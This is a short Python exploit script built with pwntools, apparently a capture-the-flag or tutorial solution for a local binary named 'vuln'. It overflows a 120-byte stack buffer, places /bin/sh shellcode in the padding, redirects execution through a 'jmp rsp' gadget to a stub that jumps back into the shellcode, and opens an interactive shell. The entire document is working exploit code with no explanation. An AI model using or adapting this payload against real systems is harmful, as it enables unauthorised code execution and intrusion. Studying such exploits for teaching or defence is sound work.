#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF('./vuln')
p = process()

jmp_rsp = next(elf.search(asm('jmp rsp')))

offset = 120

payload = flat(
    asm(shellcraft.sh()).ljust(offset, b'A'),
    jmp_rsp,
    asm(f'''
        sub rsp, { offset + 8 };
        jmp rsp;
    ''') # 128 = 120 (padding) + 8 (jmp_rsp)
)

p.sendlineafter(b'RSP!\n', payload)

p.interactive()
